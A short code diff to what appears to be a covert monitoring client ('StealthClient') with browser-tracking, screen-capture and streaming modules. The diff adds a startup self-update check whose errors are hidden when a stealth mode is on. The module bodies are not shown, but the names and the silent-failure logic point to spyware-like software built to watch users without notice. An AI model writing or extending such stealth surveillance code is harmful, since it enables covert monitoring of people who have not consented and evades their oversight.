@@ -15,6 +15,7 @@ sys.path.append('src')
 
 from src.core.config import Config
 from src.utils.api_client import APIClient
+from src.utils.auto_update import check_and_update_if_needed
 from src.modules.stream_handler import StreamHandler
 from src.modules.browser_tracker import BrowserTracker
 from src.modules.screen_capture import ScreenCapture
@@ -282,6 +283,16 @@ class StealthClient:
 
 def main():
     """Entry point"""
+    # Check for updates first (will restart if update available)
+    try:
+        if check_and_update_if_needed(Config):
+            # Update was performed, client will restart
+            return
+    except Exception as e:
+        # Update failed, continue with current version
+        if not Config.STEALTH_MODE:
+            print(f"Update check failed: {e}")
+    
     # Set up signal handlers
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
